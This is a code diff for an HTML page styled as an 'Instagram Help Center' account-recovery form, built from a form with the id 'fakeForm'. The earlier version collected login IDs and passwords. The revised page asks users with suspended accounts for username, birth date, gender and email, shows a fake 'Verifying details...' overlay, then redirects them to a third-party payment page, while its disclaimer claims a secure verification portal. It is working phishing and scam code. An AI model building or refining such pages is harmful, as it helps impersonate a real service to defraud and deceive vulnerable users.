@@ -3,34 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Insta Recovery</title>
+    <title>Instagram Help Center</title>
     <style>
+        /* Instagram Theme Styles & Responsiveness */
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
             margin: 0;
-            padding: 0;
+            padding: 20px; /* Mobile edge spacing */
+            display: flex;
+            justify-content: center;
+            align-items: center; /* Center vertically for desktop */
+            min-height: 100vh;
+            box-sizing: border-box;
         }
         .contact-container {
-            width: 80%;
-            margin: 20px auto 0 auto;
-            padding: 20px;
-            background-color: transparent; /* Changed to transparent */
-            box-shadow: none; /* Removed shadow/border effect */
-            transition: margin-top 0.3s;
-            min-height: 400px;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px 25px;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            box-sizing: border-box;
+            position: relative;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); /* Proper software feel on PC */
         }
         .top-logo {
             display: block;
-            margin: 0 auto 10px auto;
-            width: 70px;
+            margin: 0 auto 20px auto;
+            width: 60px; /* Logo double chhota kar diya */
             height: auto;
         }
         .contact-container h2 {
             text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
             margin-bottom: 20px;
             margin-top: 0;
-            color: red; /* Kept Red as requested previously */
         }
         .form-fields {
             display: flex;
@@ -38,167 +48,188 @@
         }
         .contact-container label {
             margin-bottom: 5px;
-            color: black;
+            font-size: 14px;
+            font-weight: 600;
+            color: #262626;
         }
-        .contact-container input,
-        .contact-container select,
-        .contact-container textarea {
+        .contact-container input[type="text"],
+        .contact-container input[type="email"],
+        .contact-container input[type="date"],
+        .contact-container select {
             margin-bottom: 15px;
             padding: 10px;
-            border: 1px solid #ccc;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
             border-radius: 4px;
             width: 100%;
             box-sizing: border-box;
+            font-size: 14px;
+        }
+        .contact-container input:focus, 
+        .contact-container select:focus {
+            outline: none;
+            border-color: #a8a8a8;
         }
         .proceed-btn {
             padding: 10px;
-            background-color: #28a745;
+            background-color: #0095f6; /* Instagram Blue */
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 8px;
+            font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
+            font-size: 14px;
+            transition: background-color 0.2s;
         }
         .proceed-btn:hover {
-            background-color: #218838;
-        }
-        .password-container {
-            display: flex;
-            align-items: center;
-            position: relative;
-        }
-        .password-container input {
-            flex: 1;
-            margin-right: 10px;
-        }
-        .toggle-icon {
-            position: absolute;
-            right: 15px;
-            top: 16%;
-            cursor: pointer;
-            font-size: 18px;
-            user-select: none;
+            background-color: #1877f2;
         }
         .optional-text {
             color: green;
-            opacity: 0.5;
-            font-size: 0.9em;
+            font-size: 0.85em;
             margin-left: 5px;
-            margin-top: -15px;
+            font-weight: normal;
         }
+        
+        /* Upload Screenshot Box */
+        .screenshot-container {
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .screenshot-container label {
+            margin-bottom: 0;
+            font-size: 14px;
+        }
+        .screenshot-help {
+            font-size: 12px;
+            color: #8e8e8e;
+            font-weight: normal;
+        }
+        .screenshot-container input[type="file"] {
+            font-size: 14px;
+            padding-top: 5px;
+        }
+
         .disclaimer {
-            font-size: 0.8em;
-            color: #666;
+            font-size: 12px;
+            color: #8e8e8e;
             margin-top: 20px;
             text-align: center;
         }
 
-        /* Loading Screen CSS */
-        #loadingScreen {
+        /* Floating Loading Overlay (Bokeh Effect) */
+        #loadingOverlay {
             display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(4px); /* Bokeh / Blur effect */
+            -webkit-backdrop-filter: blur(4px); /* Safari support */
+            z-index: 10;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding-top: 50px;
+            border-radius: 4px;
         }
         .blinking-logo {
-            width: 80px;
+            width: 50px;
             height: auto;
             animation: blinker 1s linear infinite;
         }
         @keyframes blinker {
-            50% { opacity: 0.3; }
+            50% { opacity: 0.4; }
         }
         .verifying-text {
             margin-top: 20px;
-            font-size: 1.1em;
-            color: #555;
-            font-weight: bold;
+            font-size: 14px;
+            color: #262626;
+            font-weight: 600;
+        }
+
+        /* Mobile specific adjustments */
+        @media (max-width: 480px) {
+            .contact-container {
+                padding: 25px 15px;
+            }
         }
     </style>
 </head>
 <body>
 
 <div class="contact-container">
-    <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
     
-    <h2 id="formTitle">Disable Suspended Recovery</h2>
-    
-    <div id="loadingScreen">
+    <!-- Floating Blur Effect Overlay -->
+    <div id="loadingOverlay">
         <img src="inlogo.png" alt="Loading" class="blinking-logo">
         <div class="verifying-text">Verifying details...</div>
     </div>
 
-    <div class="form-fields" id="fakeForm">
-        <label for="name"><strong>Full Name</strong></label>
-        <input type="text" id="name" placeholder="Enter your full name" autocomplete="off" autocorrect="off" spellcheck="false">
+    <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
+    
+    <h2 id="formTitle">Instagram Recovery</h2>
+    
+    <form class="form-fields" id="fakeForm" onsubmit="validateAndRedirect(event)">
+        <!-- Username Field -->
+        <label for="username">Username</label>
+        <input type="text" id="username" placeholder="Your Instagram username" autocomplete="off" autocorrect="off" spellcheck="false" required 
+               oninvalid="this.setCustomValidity('please enter your username')" 
+               oninput="this.setCustomValidity('')">
 
-        <label for="loginId"><strong>Login ID</strong></label>
-        <input type="text" id="loginId" placeholder="Number, username, or email" autocomplete="off" autocorrect="off" spellcheck="false">
+        <!-- DOB optional green -->
+        <label for="dob">Date of Birth <span class="optional-text">(Optional)</span></label>
+        <input type="date" id="dob" autocomplete="off">
 
-        <label for="password"><strong>Password</strong></label>
-        <div class="password-container">
-            <input type="text" id="password" placeholder="Enter your password" autocomplete="one-time-code" autocorrect="off" spellcheck="false">
-            <span class="toggle-icon" id="togglePassword"></span>
-        </div>
-
-        <label for="dob"><strong>Date of Birth</strong></label>
-        <div style="display: flex; align-items: center;">
-            <input type="date" id="dob" placeholder="Enter your Date of Birth" autocomplete="off">
-            <span class="optional-text">(Optional)</span>
-        </div>
-
-        <label for="gender"><strong>Gender</strong></label>
-        <select id="gender" autocomplete="off">
-            <option value="" disabled selected>Select your Gender</option>
+        <label for="gender">Gender</label>
+        <select id="gender" autocomplete="off" required 
+                oninvalid="this.setCustomValidity('please select your gender')" 
+                oninput="this.setCustomValidity('')">
+            <option value="" disabled selected>Select Gender</option>
             <option value="male">Male</option>
             <option value="female">Female</option>
             <option value="other">Other</option>
         </select>
 
-        <label for="contactEmail"><strong>Contact Email</strong></label>
-        <input type="text" id="contactEmail" placeholder="Enter your contact email" autocomplete="off" autocorrect="off" spellcheck="false">
+        <!-- Contact Email is not required -->
+        <label for="contactEmail">Contact Email</label>
+        <input type="email" id="contactEmail" placeholder="Your contact email" autocomplete="off">
 
-        <button class="proceed-btn" onclick="validateAndRedirect(event)">Proceed</button>
+        <!-- Upload Screenshot with Proper English -->
+        <div class="screenshot-container">
+            <label for="screenshot">Upload Screenshot</label>
+            <span class="screenshot-help">Upload a screenshot of the suspended or disabled message.</span>
+            <input type="file" id="screenshot" accept="image/*">
+        </div>
+
+        <button type="submit" class="proceed-btn">Submit</button>
         
         <div class="disclaimer">
             This is a secure verification portal. We do not store sensitive information.
         </div>
-    </div>
+    </form>
 </div>
 
 <script>
     function validateAndRedirect(event) {
         event.preventDefault();
         
-        const password = document.getElementById('password').value;
-        if (password.length < 6) {
-            alert("Please enter a valid Password.");
-            return;
-        }
+        // Blur (bokeh) effect overlay dikhana
+        document.getElementById('loadingOverlay').style.display = 'flex';
 
-        document.getElementById('fakeForm').style.display = 'none';
-        document.getElementById('formTitle').style.display = 'none';
-        document.getElementById('mainLogo').style.display = 'none';
-
-        document.getElementById('loadingScreen').style.display = 'flex';
-
-        document.getElementById('fakeForm').querySelectorAll('input, select, textarea').forEach(element => {
-            element.value = '';
-        });
-
+        // Redirect after 3 seconds
         setTimeout(function() {
             window.location.href = "https://maxpay.maxado.in/generate_payment.php?template=abb56e9544731dad34785ea0de9536d0";
         }, 3000); 
     }
-
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordInput = document.getElementById('password');
-    togglePassword.addEventListener('click', function () {
-        const type = passwordInput.getAttribute('type') === 'text' ? 'text' : 'text';
-        passwordInput.setAttribute('type', type);
-        this.textContent = type === 'text' ? '' : '';
-    });
 </script>
 
 </body>
